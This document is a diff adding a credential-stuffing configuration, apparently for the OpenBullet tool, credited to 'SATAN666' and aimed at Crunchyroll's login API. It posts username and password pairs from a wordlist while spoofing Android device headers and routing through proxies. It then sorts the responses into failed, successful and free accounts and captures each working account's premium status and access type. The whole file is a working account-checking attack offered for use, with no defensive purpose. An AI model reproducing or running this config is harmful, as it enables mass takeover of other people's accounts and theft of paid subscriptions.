@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "CrunchyRollAPI",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-03T09:32:47.9909827+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.crunchyroll.com/login.0.json" 
+  CONTENT "account=<USER>&password=<PASS>&locale=enUS&session_id=af92f1d8f5861be106903f2695adeec9" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-Android-Application-Version-Name: 2.3.1" 
+  HEADER "X-Android-Device-Manufacturer: samsung" 
+  HEADER "X-Android-SDK: 22" 
+  HEADER "Using-Brightcove-Player: 1" 
+  HEADER "X-Android-Application-Version-Code: 450" 
+  HEADER "X-Android-Release: 5.1.1" 
+  HEADER "X-Android-Device-Product: dream2qltezh" 
+  HEADER "X-Android-Device-Model: SM-G965N" 
+  HEADER "X-Android-Device-Is-GoogleTV: 0" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G965N Build/NRD90M)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login information." 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "access_type\":null," 
+
+PARSE "<SOURCE>" JSON "premium" -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "access_type" -> CAP "access type" 
+
+FUNCTION Constant "SATAN666" -> CAP "Config Creator" 
+
